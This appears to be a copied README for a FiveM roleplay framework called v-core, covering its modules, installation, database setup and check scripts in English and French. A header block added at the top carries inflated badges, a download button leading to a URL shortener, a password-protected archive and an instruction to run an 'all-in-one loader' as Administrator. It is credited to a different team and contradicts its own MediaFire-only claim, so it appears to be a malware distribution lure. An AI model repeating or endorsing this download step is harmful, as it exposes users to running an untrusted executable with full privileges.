<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Why it exists

Most FiveM frameworks are a core plus fifty third-party scripts that each bring their own UI, their own
config format and their own idea of who is allowed to do what. v-core is the opposite bet: **one
codebase, one look, one permission model**, and **everything an operator needs to tune is editable
in-game** - never by editing Lua on a live server.

## Features

- **FiveM Enhanced native** - runs on `cfx-server.exe`, `gamename: gta5enhanced`. No `sv_enforceGameBuild`
### Gameplay modules

- **`v-inventory`** - grid inventory (weight, use/drop/give), **302-item catalogue**, functional weapons
  (ammo, serial, **durability/jamming**, **attachments**), backpacks & armor, a hidden pocket, vehicle
  trunks & shared/gang stashes, and player **frisk/steal + hands-up**.
- **`v-world`** - the admin-editable world content layer (blips, store locations, jobs, items, recipes).
- **`v-admin`** - in-game panel (F10): dashboard, players, scripts, world, logs, **Editor**, and tools
  (noclip, god, invisible, player blips, spectate, open a player's inventory).
- **`v-appearance` / `v-spawn`** - appearance engine with stable clothing identity, multi-character
  selection, barber / plastic surgeon / tattoo parlour.
- **`v-crafting`** - **105 recipes** across 6 stations (workbench, reloading, kitchen, electronics,
  **recycling/refining**, hidden **drug lab**), server-authoritative, recipes editable in-game.
- **`v-gathering`** - resource nodes (mining, salvage, textile, hidden cannabis grows) feeding the crafting tier.
- **`v-shops`** - stores with **buy & sell**, vending machines, a scrap dealer, and an illegal
  **dealer / launderer** (dirty money). Store positions editable in-game.
- **`v-target`** - universal interaction eye (hold Left-Alt): entity/zone options **filtered by permission & job**.
- **`v-jobs`** - jobs, grades, on-duty salaries; the source of truth for every job gate.
- **`v-vehicles` / `v-garages`** - owned-vehicle persistence (mods, fuel, damage), server-minted
  plates, a key system, a **3D showroom preview**, and 9 garages incl. an impound lot and job motor
  pools - all editable in-game.
- **`v-fuel`** - four fuel types (regular / premium / diesel / electric), load-based consumption,
  18 stations incl. EV charging points with connector levels and a charge curve, jerry cans;
  stations and prices editable in-game.
- **`v-mechanic`** - 20-part wear model (12 for an EV) driven by distance, abuse and crashes, a real
  odometer, 27 craftable parts, roadside repair kits and job-locked shops - all editable in-game.
- **`v-vehicleshop`** - 6 dealerships, a 56-vehicle catalogue with a 3D showroom preview, test drives,
  licence-gated purchases and sell-back; dealers and catalogue editable in-game.
- **`v-licenses`** - 12 licences & permits (ID, driving, HGV, boat, pilot, weapon…) with suspension,
  revocation, expiry and demerit points; the single source of truth for character capabilities.
- **`v-cityhall`** - the city hall job desk: apply for any position an admin has left open, or resign.
  Whitelisted jobs (police, EMS, …) never show up here - they are handed out by their own chain of command.
- **`v-rentals`** - short-term hire at four counters: a deposit and a fee up front, a temporary
  `RENT###` plate and a timer. Return it in time and the deposit comes back. A rental never creates an
  ownership row, which is the single rule that separates a hire from a free car.
- **`v-factions`** - one engine for legal factions and illegal ones: they differ by which table holds
  their definition, `jobs` or `gangs`, and by nothing else. Membership, ranks, and a **treasury that is a
  real account with its own audit trail** rather than a number in a config. Salaries can be paid out of it.
- **`v-bossmenu`** (F6) - the panel a faction leader needs: members, ranks, hiring, dismissal, treasury
  and payroll. **Gated on rank, not on admin permission** - staff are not bosses.
- **`v-gangs`** - territory with capture and influence. Influence belongs to whoever holds the turf and a
  rival *wears it down* rather than taking it, so a contested turf is a fight instead of a race. Unheld
  influence decays: a turf has to be held, not taken once.
- **`v-police`** - cuffs, escort, search, seizure, charges, fines, jail and an MDT (record, warrants,
  licences, vehicles). **Police is a job, not a permission.** The penal code is data - 21 charges with
  fine, jail time and licence points, all editable in-game.
- **`v-banking`** (Fleeca ATM) · **`v-status`** (hunger/thirst/stress/bleed) · **`v-hud`** (five themes,
  ten speedometers, twenty-one dashboard tell-tales, a compass, a round minimap and a per-player settings
  menu) · **`v-sport`** (gym training: strength, breath and stamina, with a rhythm QTE) · **`v-notify`**
  · **`v-clothing`** (16 wearable slots, 10 stores, slots & stores editable in-game) · **`v-loadscreen`**.
- **`v-music`** (F4) - boomboxes, jukeboxes and the car stereo, positional and synced by
  timestamp so a late arrival joins mid-track. Host allow-list, because arbitrary URL playback
  is a moderation problem rather than a technical one.
- **`v-radio`** (F3) - the handheld: monitor several channels at once, talk on one, presets on a
  keypad. It decides no permission - it asks `v-voice`, which asks the job and gang gates.
- **`v-3dsound`** - a positional sound primitive other modules call: a name, a place and a range
  go on the wire, never audio, and only listeners in range are told.
- **`v-anticheat`** - server-side checks on movement, health, explosions, client entity creation,
  money and weapon damage. **Logs by default rather than kicking**, because an anticheat that
  kicks legitimate players is worse than none.
- **`v-voice`** - proximity voice in three steps, radio channels gated on job or gang rank, and a
  separate channel for phone calls. Bleeding narrows your range, cuffs kill the radio, and leaving
  a job leaves its channel.
- **`v-drugs`** - plantations a player places and can lose, and street dealing that pushes back:
  demand decays per district as you sell into it, and heat drives both refusals and the chance of
  a bust. Sales pay dirty money, which has to go through the launderer.
- **Economy loops** - legal: gather → craft → sell. Illegal: grow → process → deal → launder.

## Installation

1. **Artifacts** - the server binaries live in `artifacts/` (not tracked by git). Download
   **`cfx-server_win_x64.zip`** (Windows) or **`cfx-server_linux_x64.tar.xz`** (Linux) from the cfx.re
   artifacts and extract it into `artifacts/`. It must contain **`cfx-server.exe`** - `server.zip` /
   `FXServer.exe` is the **Legacy** branch and will reject Enhanced clients with `bad_request`.
## The core: v-core

`resources/[local]/v-core` is the framework. Other resources use it via exports:

```lua
local Core = exports['v-core']:GetCore()
```

To add a feature resource:

1. Create `resources/[local]/<your-resource>/` with an `fxmanifest.lua`.
2. Grab the core with `exports['v-core']:GetCore()` and build on `Core.GetPlayer`, `Core.Notify`, etc.
3. Add `ensure <your-resource>` in `server.cfg` **after** `v-core`.
4. Ship a permission-gated management UI in `v-admin` for anything an operator will want to tune -
## Database (on-demand)

Any MySQL or MariaDB instance works - the framework only talks to it through `oxmysql`, so how you run
it is your call (a service, Docker, or an on-demand local install).

Set the connection in `server.cfg`:

```cfg
set mysql_connection_string "mysql://user:password@localhost:3306/your_database?charset=utf8mb4"
```

Then import **`database/schema.sql`** (24 tables). Migrations run automatically at boot.

## Checks

Four scripts under `tools/` answer questions whose wrong answer is silent in game. Each reads
the repository, changes nothing, and exits non-zero when it finds something, so a hook or a CI
step can fail on it. Run them from the repository root:

```
python tools/lua-syntax.py        # every Lua file compiles, client ones included
python tools/privacy-sweep.py     # anything that must never be committed
python tools/locale-check.py      # keys defined once, on both sides, and every key asked for exists
python tools/manifest-check.py    # every asset a NUI page loads is one the resource serves
```

`lua-syntax` is the one that answers a question starting the server cannot. A broken CLIENT
script is never read by the server: the resource reports "Started", registers its settings and
logs nothing, and the file simply does not run when a player connects. That was measured, not
assumed - a deliberately broken client file produced a completely clean boot.

**A fifth needs a database, which is why it is listed apart.** The four above read the
repository and need nothing else. `sql-check` asks the database whether every SQL statement
in the framework is one it would accept, which a boot test cannot: booting only ever runs the
queries that run at boot, and a `SELECT` behind a shop or a phone app is not seen until a
player walks into it.

```
database\start-db.bat
set VCORE_DB=mysql://user:password@host:port/database
python tools/sql-check.py --client "C:/Program Files/MariaDB 12.3/bin/mariadb.exe"
```

`PREPARE` runs the parser and the name resolver and stops: nothing is read, nothing is
written. Over 903 complete statements it currently reports none the database refuses. It says
out loud what it does not judge rather than counting it as passing - 66 queries assembled at
runtime, and the handful written in qb-core's or ox_core's schema behind a
`Bridge.framework == 'qb'` branch, which never run here and are listed apart so a permanent
failure does not teach everybody to ignore the check.

**A module can carry its own, and the phone does.** `v-phone/tools/test-all.py` runs twenty-two
of them in the order that fails cheapest first, from a Lua compile through its own static
checks to a probe that drives a real mouse through the compositor and reports every control
reachable across all 37 apps. It has to be run from the resource's own directory, because it
globs relatively:

```
cd "resources/[local]/v-phone" && python tools/test-all.py --fast
```

`--fast` skips the 71 screenshots; without it they are rebuilt. One of its checks is a selftest
that shows every other check a fault it is supposed to catch, which is the property that stops
a green light meaning nobody looked.

`locale-check` reads the NUI JavaScript as well as the Lua, which for a module whose interface
is a web page is where nearly all of its text lives: v-phone asks for 591 keys from `app.js`
and four from Lua. Reading only Lua validated four keys out of 852 and reported success. The
phone resolves a key with `S[k] || k`, so a missing one is rendered to the player as its own
name. The interfaces do not agree on a name for that resolver - v-phone calls it `L`,
v-appearance and v-inventory call it `t`, v-hud reaches it as `S.t` - and all four are read,
which is what brought v-hud's 118 menu strings and v-inventory's 13 under the check.

Each was written because the thing it looks for had already happened at least once here: a live
connection string in a tracked file, a key defined twice where the second silently won, and a
script the page loaded that the manifest did not list, which 404s and leaves a feature doing
nothing.

Two of the three are silent today. `privacy-sweep` still reports one line - the database URL in
`server.cfg`, credentials and all, in a tracked file. It is `root:root` against a local MariaDB
in a private repository, so the exposure is small, but the fix is the pattern the same file
already uses for its licence key: move the line into a gitignored `database.cfg` and `exec` it,
at the cost of one setup step on every new machine. That trade is the operator's to make, which
is why the checker reports it rather than anything having changed it.

Two modules carry their own deeper checks, which validate balance, locales, NUI callbacks and
manifest against that module's own rules. They find their resource from their own location, so
they run from the repository root like the rest:

```
python "resources/[local]/v-sport/tools/check.py"
python "resources/[local]/v-phone/tools/check.py"
```

## Credits

Author: vyrriox

---

# v-core - un framework roleplay pour FiveM Enhanced (Version Française)

**v-core** est un framework roleplay complet et autonome pour **FiveM Enhanced** (l'édition next-gen de
GTA V). 39 modules, un seul design system, une seule base de données, aucune dépendance à un framework
externe - ce n'est pas un pack d'add-ons pour ESX ou QBCore, c'est *le* framework.

Développé et testé sur le binaire serveur Enhanced (`cfx-server.exe`), OneSync, MariaDB via `oxmysql`.

> **État :** en développement actif sur `main`.
>
> | Document | Contenu |
> |---|---|
## Pourquoi

La plupart des frameworks FiveM, c'est un core plus cinquante scripts tiers qui apportent chacun leur UI,
leur format de config et leur propre idée de qui a le droit de faire quoi. v-core fait le pari inverse :
**une seule base de code, un seul look, un seul modèle de permissions**, et **tout ce qu'un opérateur doit
régler est modifiable en jeu** - jamais en éditant du Lua sur un serveur en production.

## Caractéristiques

- **Natif FiveM Enhanced** - tourne sur `cfx-server.exe`, `gamename: gta5enhanced`. Pas de
  `sv_enforceGameBuild` (ce sont des numéros de build Legacy, qui bloquent les clients Enhanced).
### Modules de gameplay

- **`v-inventory`** - inventaire grille (poids, utiliser/jeter/donner), **catalogue de 302 items**, armes
  fonctionnelles (munitions, série, **durabilité/enrayage**, **accessoires**), sacs & armure, poche cachée,
  coffres de véhicule & stashes partagés/gang, et **fouille/vol de joueur + mains en l'air**.
- **`v-world`** - la couche de contenu modifiable par les admins (blips, boutiques, métiers, items, recettes).
- **`v-admin`** - panneau en jeu (F10) : tableau de bord, joueurs, scripts, monde, logs, **Éditeur**, et
  outils (noclip, mode dieu, invisible, blips joueurs, observation, ouvrir l'inventaire d'un joueur).
- **`v-appearance` / `v-spawn`** - moteur d'apparence à identité vêtement stable, sélection
  multi-personnages, coiffeur / chirurgien / salon de tatouage.
- **`v-crafting`** - **105 recettes** sur 6 stations (établi, rechargement, cuisine, électronique,
  **recyclage/raffinage**, **labo de drogue** caché), autoritaire serveur, recettes éditables en jeu.
- **`v-gathering`** - points de ressources (minage, casse, textile, cultures de cannabis cachées).
- **`v-shops`** - boutiques avec **achat & vente**, distributeurs, revendeur de ferraille, et
  **dealer / blanchisseur** illégal (argent sale). Positions modifiables en jeu.
- **`v-target`** - œil d'interaction universel (maintiens Alt gauche) : options **filtrées par permission & métier**.
- **`v-jobs`** - métiers, grades, salaires en service ; la référence pour tous les gates métier.
- **`v-vehicles` / `v-garages`** - persistance des véhicules possédés (mods, carburant, dégâts),
  plaques générées par le serveur, système de clés, et 9 garages dont une fourrière et les garages
  de métier, et un **aperçu 3D showroom** - le tout modifiable en jeu.
- **`v-fuel`** - quatre carburants (91 / 98 / gazole / électrique), consommation selon la charge
  moteur, 18 stations dont des bornes de recharge à plusieurs niveaux avec courbe de charge,
  jerricans ; stations et prix modifiables en jeu.
- **`v-mechanic`** - usure sur 20 pièces (12 en électrique) selon la distance, la conduite et les
  accidents, vrai compteur kilométrique, 27 pièces fabricables, kits de réparation et ateliers
  verrouillés par métier - le tout modifiable en jeu.
- **`v-vehicleshop`** - 6 concessions, catalogue de 56 véhicules avec aperçu 3D showroom, essais
  routiers, achats conditionnés au permis et revente ; concessions et catalogue modifiables en jeu.
- **`v-licenses`** - 12 licences & permis (identité, conduite, poids lourd, bateau, pilote, port
  d'arme…) avec suspension, retrait, expiration et points ; la référence unique des droits du perso.
- **`v-cityhall`** - le guichet emploi de la mairie : postuler à un poste laissé ouvert par un admin,
  ou démissionner. Les métiers sur whitelist (police, EMS, …) n'y apparaissent jamais.
- **`v-rentals`** - location courte durée à quatre comptoirs : caution et frais prélevés d'avance, plaque
  temporaire `RENT###` et minuteur. Rendu à temps, la caution revient. Une location ne crée jamais de ligne
  de propriété : c'est la seule règle qui sépare une location d'une voiture gratuite.
- **`v-factions`** - un seul moteur pour les factions légales et illégales : elles diffèrent par la table
  qui porte leur définition, `jobs` ou `gangs`, et par rien d'autre. Adhésion, rangs, et une **trésorerie
  qui est un vrai compte avec sa piste d'audit** plutôt qu'un nombre dans un fichier. Les salaires peuvent
  en sortir.
- **`v-bossmenu`** (F6) - le panneau dont un patron a besoin : membres, rangs, recrutement, renvoi,
  trésorerie et paie. **Verrouillé sur le rang, pas sur la permission admin** - le staff n'est pas patron.
- **`v-gangs`** - territoires avec capture et influence. L'influence appartient à celui qui tient le
  territoire et un rival l'*use* au lieu de la prendre : un territoire contesté est un combat, pas une
  course. L'influence non défendue décroît, un territoire doit être tenu et pas seulement pris.
- **`v-police`** - menottes, escorte, fouille, saisie, inculpation, amendes, prison et un MDT (casier,
  mandats, permis, véhicules). **La police est un métier, pas une permission.** Le code pénal est une
  donnée : 21 infractions avec amende, prison et points de permis, modifiables en jeu.
- **`v-banking`** (DAB Fleeca) · **`v-status`** (faim/soif/stress/saignement) · **`v-hud`** (cinq thèmes,
  dix compteurs, vingt et un témoins de tableau de bord, une boussole, une minimap ronde et un menu de
  réglages par joueur) · **`v-sport`** (salle de sport : force, souffle et endurance, avec un QTE rythmé) · **`v-notify`**
  · **`v-clothing`** (16 emplacements portables, 10 boutiques, emplacements & boutiques modifiables en jeu) · **`v-loadscreen`**.
- **`v-music`** (F4) - enceintes, juke-box et autoradio, positionnels et synchronisés par
  horodatage pour qu'un arrivant tardif tombe en cours de morceau. Liste blanche d'hôtes, parce
  que la lecture d'URL arbitraires est un problème de modération, pas technique.
- **`v-radio`** (F3) - l'appareil : suivre plusieurs canaux à la fois, émettre sur un seul,
  présélections sur un pavé. Il ne décide d'aucune permission - il demande à `v-voice`.
- **`v-3dsound`** - un primitif de son positionnel que les autres modules appellent : un nom, un
  lieu et une portée passent sur le fil, jamais de l'audio, et seuls les auditeurs à portée sont prévenus.
- **`v-anticheat`** - contrôles serveur sur les déplacements, la santé, les explosions, la création
  d'entités par le client, l'argent et les dégâts d'arme. **Journalise par défaut au lieu
  d'expulser**, parce qu'un anticheat qui expulse des joueurs légitimes est pire que rien.
- **`v-voice`** - voix de proximité en trois paliers, canaux radio verrouillés sur le métier ou le
  rang de gang, et un canal séparé pour les appels. Un saignement réduit la portée, les menottes
  coupent la radio, et quitter un métier quitte son canal.
- **`v-drugs`** - des plantations que le joueur pose et peut perdre, et un deal de rue qui résiste :
  la demande décroît par quartier à mesure qu'on y vend, et la chaleur pilote les refus comme le
  risque d'interpellation. Les ventes paient en argent sale, qui doit passer par le blanchisseur.
- **Boucles économiques** - légale : récolter → fabriquer → vendre. Illégale : cultiver → traiter → dealer → blanchir.

## Installation

1. **Artifacts** - les binaires serveur vont dans `artifacts/` (non suivi par git). Télécharge
   **`cfx-server_win_x64.zip`** (Windows) ou **`cfx-server_linux_x64.tar.xz`** (Linux) depuis les artifacts
   cfx.re et extrais-les dans `artifacts/`. L'archive doit contenir **`cfx-server.exe`** - `server.zip` /
   `FXServer.exe` est la branche **Legacy** et refusera les clients Enhanced avec `bad_request`.
## Le core : v-core

`resources/[local]/v-core` est le framework. Les autres ressources l'utilisent via les exports :

```lua
local Core = exports['v-core']:GetCore()
```

Pour ajouter une ressource :

1. Crée `resources/[local]/<ta-ressource>/` avec un `fxmanifest.lua`.
2. Récupère le core avec `exports['v-core']:GetCore()` et bâtis sur `Core.GetPlayer`, `Core.Notify`, etc.
3. Ajoute `ensure <ta-ressource>` dans `server.cfg` **après** `v-core`.
4. Livre une UI de gestion protégée par permission dans `v-admin` pour tout ce qu'un opérateur voudra
## Base de données (à la demande)

N'importe quelle instance MySQL ou MariaDB convient - le framework ne lui parle qu'à travers `oxmysql`,
donc la façon de la lancer t'appartient (service, Docker, ou installation locale à la demande).

Configure la connexion dans `server.cfg` :

```cfg
set mysql_connection_string "mysql://user:password@localhost:3306/ta_base?charset=utf8mb4"
```

Puis importe **`database/schema.sql`** (24 tables). Les migrations s'appliquent automatiquement au démarrage.

## Contrôles

Quatre scripts dans `tools/` répondent à des questions dont la mauvaise réponse est silencieuse
en jeu. Chacun lit le dépôt, ne modifie rien, et sort en code non nul quand il trouve quelque
chose, pour qu'un hook ou une étape de CI puisse échouer dessus. À lancer depuis la racine :

```
python tools/lua-syntax.py        # chaque fichier Lua compile, y compris les fichiers client
python tools/privacy-sweep.py     # tout ce qui ne doit jamais être commité
python tools/locale-check.py      # clés définies une fois, des deux côtés, et toutes celles utilisées existent
python tools/manifest-check.py    # chaque asset chargé par une page NUI est bien servi par la ressource
```

`lua-syntax` répond à une question que démarrer le serveur ne peut pas trancher. Un script
CLIENT cassé n'est jamais lu par le serveur : la ressource annonce « Started », enregistre ses
réglages et ne journalise rien, et le fichier ne tourne simplement pas quand un joueur se
connecte. Cela a été mesuré et non supposé : un fichier client volontairement cassé a produit
un démarrage totalement propre.

**Un cinquième exige une base de données, d'où sa place à part.** Les quatre ci-dessus lisent
le dépôt et n'ont besoin de rien d'autre. `sql-check` demande à la base si chaque requête SQL
du framework est une requête qu'elle accepterait, ce qu'un démarrage ne peut pas dire : il
n'exécute que les requêtes du démarrage, et un `SELECT` derrière une boutique ou une
application du téléphone n'est vu que lorsqu'un joueur s'en approche.

```
database\start-db.bat
set VCORE_DB=mysql://user:password@host:port/database
python tools/sql-check.py --client "C:/Program Files/MariaDB 12.3/bin/mariadb.exe"
```

`PREPARE` fait tourner l'analyseur et le résolveur de noms puis s'arrête : rien n'est lu, rien
n'est écrit. Sur 903 requêtes complètes, aucune n'est refusée aujourd'hui. Il dit à voix haute
ce qu'il ne juge pas plutôt que de le compter comme réussi : 66 requêtes assemblées à
l'exécution, et la poignée écrites dans le schéma de qb-core ou d'ox_core derrière une branche
`Bridge.framework == 'qb'`, qui ne tournent jamais ici et sont listées à part pour qu'un échec
permanent n'apprenne à personne à ignorer le contrôle.

**Un module peut porter la sienne, et le téléphone le fait.** `v-phone/tools/test-all.py` en
enchaîne vingt-deux, dans l'ordre où l'échec coûte le moins cher d'abord : compilation Lua,
ses propres contrôles statiques, puis une sonde qui pilote une vraie souris à travers le
compositeur et vérifie que chaque commande est atteignable sur les 37 applications. À lancer
depuis le dossier de la ressource, car ses motifs sont relatifs :

```
cd "resources/[local]/v-phone" && python tools/test-all.py --fast
```

`--fast` saute les 71 captures ; sans lui elles sont reconstruites. L'un de ces contrôles est
un autotest qui montre à chacun des autres une faute qu'il doit attraper, la propriété qui
empêche un feu vert de vouloir dire que personne n'a regardé.

`locale-check` lit aussi le JavaScript des pages NUI, et non le seul Lua. Pour un module dont
l'interface est une page web, c'est là que vit presque tout le texte : v-phone demande 591 clés
à `app.js` et quatre au Lua. Ne lire que le Lua validait quatre clés sur 852 en annonçant que
tout allait bien. Le téléphone résout une clé par `S[k] || k`, donc une clé absente s'affiche au
joueur sous son propre nom. Les interfaces ne s'accordent pas sur le nom de ce résolveur :
v-phone l'appelle `L`, v-appearance et v-inventory `t`, v-hud y accède par `S.t`. Les quatre
formes sont lues, ce qui a fait entrer sous contrôle les 118 chaînes du menu de v-hud et les 13
de v-inventory.

Chacun a été écrit parce que ce qu'il cherche s'était déjà produit ici au moins une fois : une
chaîne de connexion vivante dans un fichier suivi, une clé définie deux fois dont la seconde
gagnait en silence, et un script chargé par la page que le manifeste ne listait pas, qui répond
404 et laisse une fonctionnalité inerte.

Deux des trois sont silencieux aujourd'hui. `privacy-sweep` signale encore une ligne : l'URL de
base de données dans `server.cfg`, identifiants compris, dans un fichier suivi. C'est
`root:root` contre un MariaDB local dans un dépôt privé, donc l'exposition est faible, mais le
remède est le motif que ce même fichier applique déjà à sa clé de licence : déplacer la ligne
dans un `database.cfg` gitignoré et l'`exec`, au prix d'une étape de configuration sur chaque
nouvelle machine. Cet arbitrage appartient à l'opérateur : c'est pourquoi le contrôle le signale
au lieu que quoi que ce soit l'ait modifié.

Deux modules embarquent leurs propres contrôles plus profonds, qui valident l'équilibrage, les
locales, les callbacks NUI et le manifeste selon les règles du module. Ils trouvent leur
ressource depuis leur propre emplacement, donc ils se lancent depuis la racine comme les autres :

```
python "resources/[local]/v-sport/tools/check.py"
python "resources/[local]/v-phone/tools/check.py"
```

## Credits

Author: vyrriox


---

# Contributing to v-core

Thanks for looking. This document is short on purpose - the details live in
## What gets merged quickly

- A fix with a one-line explanation of the **failure**, not just the change.
- A new module that declares itself with `V.Module` and appears in the admin panel.
- A setting that real code reads.

## What gets sent back

- **A setting nothing reads.** It is worse than no setting: it lies to the operator, who
  changes it, sees nothing happen, and reports the module as broken.
- **A cached setting.** Read it where you use it. A module that caches at boot makes its
  own settings inert until the next restart.
- **Client-trusted state.** Money, items, positions and permissions are validated
  server-side even when the client already checked. A client payload is a request.
- **Hardcoded colours in NUI.** Use the v-ui theme tokens or your page will be the one
  that does not change when the operator picks a different palette.
- **Player-facing text inline.** It belongs in `locales/en.lua` and `locales/fr.lua`.
- **A chat command for players.** Interaction goes through the phone, the radial menu,
  the pause menu or a keybind. Admin commands are fine.

## Commit messages

`type: what changed and why it was wrong`

```
fix(garages): Config.StoreMaxDamage was read nowhere, so a wreck could be
parked and taken back out repaired
```

The *why* is the part that is worth writing. `fix: bug` tells a future maintainer
nothing.

## Reporting a bug

Include the server log around the failure, the resource, and what you expected. If it is
a NUI issue, the browser console from `F8` → `nui_devtools` is usually decisive.

---

# Contribuer à v-core (version française)

Merci de votre intérêt. Ce document est volontairement court - l'essentiel est dans
## Ce qui est refusé

- **Un réglage que personne ne lit** - pire que pas de réglage : il ment à l'admin.
- **Un réglage mis en cache au démarrage** - il devient inerte jusqu'au prochain reboot.
- **Un état auquel on fait confiance côté client** - argent, objets, positions et
  permissions sont revalidés côté serveur.
- **Des couleurs en dur dans le NUI** - utilisez les tokens de thème v-ui.
- **Du texte joueur en dur** - il va dans `locales/`.
- **Une commande chat pour les joueurs** - téléphone, menu radial, menu pause ou raccourci.

## Messages de commit

`type: ce qui change et pourquoi c'était faux`. Le *pourquoi* est la partie qui compte.

## Credits

Author: vyrriox


---

                                 Apache License
                           Version 2.0, January 2004
